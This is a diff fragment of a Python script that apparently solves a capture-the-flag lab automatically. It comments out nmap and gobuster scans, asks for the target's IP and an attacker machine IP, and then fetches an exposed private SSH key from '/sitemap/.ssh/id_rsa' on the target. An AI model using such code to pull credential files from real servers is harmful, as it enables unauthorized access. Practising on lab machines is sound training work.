@@ -55,13 +55,13 @@ def main():
     AttackerMachineIp=input("What is the Attacker machine IP : ")
     print("Challenge Started\n\n")
 
-    print(nmapScan(IP))
+    # print(nmapScan(IP))
     url_1=f"http://{IP}"
-    print(goBuster(url_1))
+    #print(goBuster(url_1))
     url_2=f"{url_1}/sitemap"
-    print(goBuster(url_2))
+    #print(goBuster(url_2))
     url_3=f"{url_2}/.ssh"
-    print(goBuster(url_3))
+    #print(goBuster(url_3))
     url_4=url_3+"/id_rsa"
     r=requests.get(url_4,verify=False)
 
